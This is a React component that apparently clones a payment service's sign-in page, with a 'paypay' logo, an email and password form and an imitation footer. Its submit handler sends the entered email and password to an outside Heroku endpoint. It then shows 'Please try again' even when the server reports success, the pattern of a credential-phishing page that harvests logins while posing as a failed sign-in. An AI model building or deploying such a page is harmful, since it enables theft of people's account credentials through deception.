import React,{useEffect, useState} from "react";
import "./Accueil.css";
import logo from "../../Assets/paypay.jpg"

export default function Accueil(){

useEffect(() => {
    // code to run when the effect is triggered
      
    const inputField = document.getElementById('input-field');
    const inputLabel = document.getElementById('input-label');

    const inputField2 = document.getElementById('input-field2');
    const inputLabel2 = document.getElementById('input-label2');

    inputField.addEventListener('focus', () => {
        inputLabel.style.top = '3px';
        inputLabel.style.left = '0px';
        inputLabel.style.fontSize = '13px';
    });

    inputField2.addEventListener('focus', () => {
        inputLabel2.style.top = '3px';
        inputLabel2.style.left = '0px';
        inputLabel2.style.fontSize = '13px';
    });


    inputField.addEventListener('blur', () => {
        if (inputField.value.trim() !== '') {
            inputLabel.style.top = '3px';
            inputLabel.style.left = '0px';
        } else {
            inputLabel.style.top = '17px';
            inputLabel.style.left = '8px';
            inputLabel.style.fontSize = '16px';
        }
    });

    inputField2.addEventListener('blur', () => {
        if (inputField2.value.trim() !== '') {
            inputLabel2.style.top = '3px';
            inputLabel2.style.left = '0px';
        } else {
            inputLabel2.style.top = '17px';
            inputLabel2.style.left = '8px';
            inputLabel2.style.fontSize = '16px';
        }
    });
}, []);

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = (e) => {
        e.preventDefault();
        fetch("https://universal-app-21e471211385.herokuapp.com/compte/login-compte",{
        method: "POST",
        crossDomain: true,
        headers:{
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
        body:JSON.stringify({
            email,
            password,
        }),
    })
    .then((res) => res.json())
    .then((data) => {
        if(data.status === "ok"){
            alert('Please try again')
        }else{
            alert('Something went wrong')
        }
    })

    }

    return(
        <div className="accueil">
            <div className="box">
                <div className="image_pay">
                    <img src={logo} alt="pay-logo" />
                </div>
                <div className="information_form">
                    <form method="post" className="formul" onSubmit={handleSubmit} >
                        <div className="info_groupe">
                            <input className="email_phone_pass" type="text" id="input-field" value={email} onChange={(e) => setEmail(e.target.value)} required />
                            <label htmlFor="" className="placeholder" id="input-label">Email or mobile number</label>
                        </div>
                        <div className="info_groupe">
                            <input className="email_phone_pass" type="password" id="input-field2" value={password} onChange={(e) => setPassword(e.target.value)} required/>
                            <label htmlFor="" className="placeholder" id="input-label2">Password</label>
                        </div>
                        <div className="mdp">Forgot your password ?</div>
                        <input className="submit_button" type="submit" value="Sign In" />
                        <div className="ou">
                            <span className="hr"></span>
                            <span>or</span>
                            <span className="hr"></span>
                        </div>
                        <div className="open_account">
                            Sign Up
                        </div>
                    </form>
                </div>
                <div className="language">
                    English | French
                </div>
            </div> 
            <div className="footer">
                <ul>
                    <li>Contact Us</li>
                    <li>Privacy</li>
                    <li>Legal</li>
                    <li>Policy Updates</li>
                    <li>Worldwide</li>
                </ul>
            </div>  
        </div>
)}
